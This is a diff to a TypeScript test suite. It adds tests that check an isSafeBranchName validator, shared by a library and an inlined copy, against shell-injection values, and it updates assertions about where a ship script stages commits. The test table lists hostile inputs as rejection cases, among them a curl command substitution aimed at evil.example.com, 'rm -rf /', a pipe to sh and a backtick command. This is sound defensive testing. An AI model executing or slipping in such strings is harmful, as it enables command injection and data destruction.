@@ -7,6 +7,7 @@ import { stripStringsAndComments, strippingPreservesSyntax } from "../lib/js-top
 import {
   buildSafeGitAdd,
   buildSafeSSHCommand,
+  isSafeBranchName,
   resolveEvidencePath,
   validateEvidenceCommand,
 } from "../lib/workflow-security";
@@ -43,7 +44,7 @@ function loadShipSecurityHelpers(projectRoot: string) {
     `${securityBlock()}
      return {
        relativizePaths, safeGitAddCommand, safeSSHCommand,
-       buildSafeGitAdd, buildSafeSSHCommand,
+       buildSafeGitAdd, buildSafeSSHCommand, isSafeBranchName,
        resolveEvidencePath, validateEvidenceCommand, validateFilePaths,
      };`,
   );
@@ -108,13 +109,54 @@ describe("prove.js heredocSafe (#137)", () => {
 });
 
 describe("AC-1: lib/workflow-security.ts exported surface", () => {
-  test("exports exactly seven security functions", () => {
+  test("exports exactly eight security functions", () => {
     const source = readFileSync(
       join(REPO_ROOT, "lib", "workflow-security.ts"),
       "utf-8",
     );
     const exported = source.match(/^export function /gm) || [];
-    expect(exported.length).toBe(7);
+    expect(exported.length).toBe(8);
+  });
+});
+
+/**
+ * #136 made the branch name flow from the run into the command — `--head
+ * ${shipBranch}` — instead of asking a checkout for it at the time. That is
+ * the right direction; an agent recovering from a failed bare push chose
+ * `HEAD:main` once. But the value still reaches a shell, and it comes from
+ * an agent's reply or from a PR listing, so it is checked before it gets
+ * there. Executed against both copies, library and inlined, because a
+ * divergence between them is the whole reason this file exists.
+ */
+describe("isSafeBranchName (#136) — library and inlined copy agree", () => {
+  const inlined = loadShipSecurityHelpers("/tmp/project").isSafeBranchName;
+
+  const CASES: Array<[string, unknown, boolean]> = [
+    ["an ordinary branch", "fix-136-no-auto-merge", true],
+    ["a namespaced branch", "feature/issue-72/tsconfig", true],
+    ["dots and underscores", "release_1.2.3", true],
+    ["main itself is a valid NAME — the refusal to use it is separate", "main", true],
+
+    ["a command substitution", "fix$(curl evil.example.com)", false],
+    ["a separator", "fix; rm -rf /", false],
+    ["a pipe", "fix|sh", false],
+    ["a space", "fix 136", false],
+    ["a quote", `fix"branch`, false],
+    ["a backtick", "fix`id`", false],
+    ["a newline", "fix\nmain", false],
+    ["a leading dash, which git and gh both read as a flag", "-D", false],
+    ["a traversal, which climbs out of a refspec", "fix/../main", false],
+    ["a doubled slash", "fix//main", false],
+    ["a trailing slash", "fix/", false],
+    ["a .lock suffix, which git refuses", "fix.lock", false],
+    ["empty", "", false],
+    ["not a string", undefined, false],
+    ["absurdly long", "a".repeat(256), false],
+  ];
+
+  test.each(CASES)("%s", (_label, value, expected) => {
+    expect(isSafeBranchName(value)).toBe(expected);
+    expect(inlined(value)).toBe(expected);
   });
 });
 
@@ -405,11 +447,17 @@ describe("ship.js stages from git, not from an agent's file list", () => {
     // Commit call to PROJECT_ROOT survived every other assertion here while
     // staging the wrong tree whenever Marcus worked in a worktree — which is
     // #81, the bug the collect step exists to handle.
+    //
+    // All three stage commitDir since #136. The two regression recommits used
+    // to stage and commit in PROJECT_ROOT, which has the same defect this
+    // comment describes for the Commit path — and it mattered more there,
+    // because those two then ran a bare `git push` from the checkout they had
+    // just committed in.
     const args = derived.map(({ l }) => l.match(/gitDerivedStaging\(([^)]*)\)/)?.[1]);
-    expect(args.filter(a => a === "commitDir"), "the Commit path no longer stages commitDir")
-      .toHaveLength(1);
-    expect(args.filter(a => a === "PROJECT_ROOT"), "a regression recommit changed target")
-      .toHaveLength(2);
+    expect(args.filter(a => a === "commitDir"), "a commit path stopped staging commitDir")
+      .toHaveLength(3);
+    expect(args.filter(a => a === "PROJECT_ROOT"), "a commit path stages the shared checkout again")
+      .toHaveLength(0);
   });
 
   test("staging happens in exactly one place, behind an empty-worktree guard", () => {
